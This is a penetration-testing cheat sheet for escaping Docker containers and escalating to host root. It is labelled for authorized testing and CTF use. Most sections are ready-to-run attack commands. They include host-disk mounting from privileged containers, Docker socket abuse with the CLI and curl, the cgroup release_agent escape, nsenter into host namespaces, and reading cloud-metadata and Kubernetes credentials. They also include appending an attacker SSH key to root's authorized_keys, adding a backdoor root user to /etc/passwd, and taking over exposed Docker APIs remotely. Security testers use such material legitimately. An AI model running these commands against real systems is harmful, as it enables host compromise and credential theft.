# Docker Privilege Escalation — Cheat Sheet

> **Scope:** Techniques for escaping Docker containers, escalating privileges within them, and abusing Docker misconfigurations on the host. For authorized penetration testing and CTF use only.

---

## 1. Reconnaissance — Am I Inside a Container?

```bash
# Check for .dockerenv file
ls -la /.dockerenv

# Check cgroup
cat /proc/1/cgroup | grep docker

# Check hostname (often a short hash)
hostname

# Inspect init process
cat /proc/1/cmdline

# Check for container-specific mounts
cat /proc/mounts | grep -E "overlay|docker"

# Check environment variables
env | grep -iE "docker|kube|container"
```

---

## 2. Privileged Container Escape

When a container runs with `--privileged`, it has full host capabilities.

```bash
# Verify privileged mode
cat /proc/self/status | grep CapEff
# If CapEff = 0000003fffffffff → privileged

# Mount the host filesystem
mkdir /tmp/hostmnt
mount /dev/sda1 /tmp/hostmnt      # adjust device as needed
chroot /tmp/hostmnt               # drop into host root

# Alternative: write SSH key to host
mkdir -p /tmp/hostmnt/root/.ssh
cat ~/.ssh/id_rsa.pub >> /tmp/hostmnt/root/.ssh/authorized_keys
```

---

## 3. Docker Socket Abuse (`/var/run/docker.sock`)

If the socket is mounted inside the container, you control the Docker daemon.

```bash
# Check for the socket
ls -la /var/run/docker.sock

# Spawn a privileged container that mounts the host FS
docker -H unix:///var/run/docker.sock run -it \
  --privileged \
  -v /:/host \
  alpine chroot /host sh

# Pull an image and escape (no chroot needed)
docker -H unix:///var/run/docker.sock run -it \
  -v /:/mnt \
  ubuntu bash

# From inside the new container
cat /mnt/etc/shadow
chroot /mnt bash
```

### Via `curl` (no Docker CLI available)

```bash
curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/containers/create" \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/host"],"Privileged":true}'
```

---

## 4. Capabilities Abuse

### Check Current Capabilities

```bash
capsh --print
cat /proc/self/status | grep -i cap

# Decode hex cap value
python3 -c "import subprocess; subprocess.run(['capsh','--decode=<HEX_VALUE>'])"
```

### Dangerous Capabilities

| Capability | Escape Method |
|---|---|
| `CAP_SYS_ADMIN` | Mount filesystems, `unshare`, `nsenter` |
| `CAP_NET_ADMIN` | Reroute traffic, sniff packets |
| `CAP_SYS_PTRACE` | Inject into host processes via `/proc/<pid>/mem` |
| `CAP_DAC_READ_SEARCH` | Read any file (bypass DAC) with `shocker.c` |
| `CAP_SYS_MODULE` | Load kernel modules |
| `CAP_CHOWN` | Change ownership of sensitive files |

### CAP_SYS_ADMIN — cgroup release_agent

```bash
# Classic cgroup escape
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /proc/mounts)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "id > $host_path/output" >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output    # contains host root id output
```

### CAP_SYS_PTRACE — Process Injection

```bash
# Find a host process (PID namespace must be shared or leaked)
ps aux

# Inject shellcode via /proc/<PID>/mem
# Use tools like: https://github.com/nongiach/sudo_inject
```

### CAP_SYS_MODULE — Load Kernel Module

```bash
# Compile a reverse shell kernel module on host, load from container
insmod /path/to/reverse_shell.ko
```

---

## 5. Namespace Escapes

### Using `nsenter`

```bash
# If running as root with SYS_ADMIN
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# Shorter form
nsenter -t 1 -m -u -i -n -p bash
```

### Using `unshare`

```bash
# Create new user namespace mapping root
unshare -UrmC bash
```

---

## 6. Weak `seccomp` / `AppArmor` Profiles

```bash
# Check if seccomp is enforced
cat /proc/self/status | grep Seccomp
# 0 = disabled, 1 = strict, 2 = filter

# Check AppArmor profile
cat /proc/self/attr/current
# "unconfined" = no AppArmor

# Check if docker ran with --security-opt seccomp=unconfined
docker inspect <container_id> | grep -i seccomp
```

---

## 7. Sensitive File & Secret Discovery

```bash
# Environment variables (credentials, tokens)
env
cat /proc/1/environ | tr '\0' '\n'

# Docker secrets (Swarm)
ls /run/secrets/

# Kubernetes secrets (if mounted)
ls /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# AWS credentials
cat /root/.aws/credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Config files
find / -name "*.env" -o -name "config.yml" -o -name "*.conf" 2>/dev/null | head -20

# SSH keys
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
```

---

## 8. Exposed Host Mounts

```bash
# List mounts
mount | grep -v "proc\|sys\|dev\|cgroup"
cat /proc/mounts

# Check if host directories are mounted
ls -la /host /mnt /data /backup 2>/dev/null

# If /etc is mounted from host — read shadow, add user
cat /etc/shadow
echo "hacker:$(openssl passwd -1 password):0:0:root:/root:/bin/bash" >> /etc/passwd
```

---

## 9. Docker API Exposed on Network

```bash
# Default unauthenticated Docker API ports
# TCP 2375 (HTTP) and 2376 (TLS)

# Check from outside
curl http://<host>:2375/version
curl http://<host>:2375/containers/json

# Spawn privileged container remotely
docker -H tcp://<host>:2375 run -it --privileged -v /:/host alpine chroot /host sh
```

---

## 10. Abusing SUID Binaries Inside Container

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Common SUID escapes → GTFOBins (https://gtfobins.github.io)
# Examples:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash"'
find . -exec /bin/bash -p \; -quit
```

---

## 11. Writable `/etc/passwd` or `/etc/shadow`

```bash
# Check write permissions
ls -la /etc/passwd /etc/shadow

# Add root user to /etc/passwd
openssl passwd -1 "password123"   # generate hash
echo 'r00t:$1$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
su r00t
```

---

## 12. Container Breakout via `runc` CVEs

| CVE | Description | Impact |
|---|---|---|
| CVE-2019-5736 | runc binary overwrite via `/proc/self/exe` | Host root |
| CVE-2020-15257 | Shim API socket exposure (containerd) | Privilege escalation |
| CVE-2021-30465 | runc symlink exchange during mount | File write on host |
| CVE-2022-0492 | cgroup v1 release_agent | Container escape |
| CVE-2024-21626 | runc working directory leakage | Host file access |

```bash
# Check runc version
runc --version
dockerd --version
containerd --version
```

---

## 13. Docker Buildkit & Build-Time Secrets Leakage

```bash
# Inspect image layers for secrets
docker history --no-trunc <image>
docker save <image> | tar -xO --wildcards '*/layer.tar' | tar -tv

# Use dive for layer inspection
dive <image>

# Check for secrets baked into ENV or RUN steps
docker inspect <image> | jq '.[].Config.Env'
```

---

## 14. Tools Reference

| Tool | Purpose | URL |
|---|---|---|
| `deepce` | Automated Docker escape checker | github.com/stealthcopter/deepce |
| `amicontained` | Container introspection | github.com/genuinetools/amicontained |
| `cdktools` | Container pentest toolkit | github.com/cdk-team/CDK |
| `botb` | Break Out The Box | github.com/brompwnie/botb |
| `peirates` | Kubernetes penetration | github.com/inguardians/peirates |
| `traitor` | Automatic Linux privesc | github.com/liamg/traitor |
| GTFOBins | SUID/sudo binary escapes | gtfobins.github.io |

---

## 15. Quick Checklist

- [ ] `/.dockerenv` exists → confirmed inside container
- [ ] `/var/run/docker.sock` mounted → instant escape
- [ ] `--privileged` flag → mount host disk
- [ ] `CAP_SYS_ADMIN` → cgroup release_agent escape
- [ ] Docker API on port 2375/2376 → remote escape
- [ ] Sensitive env vars / mounted secrets
- [ ] Writable host paths mounted
- [ ] `seccomp=unconfined` + `apparmor=unconfined`
- [ ] Outdated `runc` / `containerd` → known CVEs
- [ ] SUID binaries → GTFOBins
- [ ] `/etc/passwd` writable → add root user

---

*References: HackTricks, PayloadsAllTheThings, OWASP Docker Security, NCC Group research.*
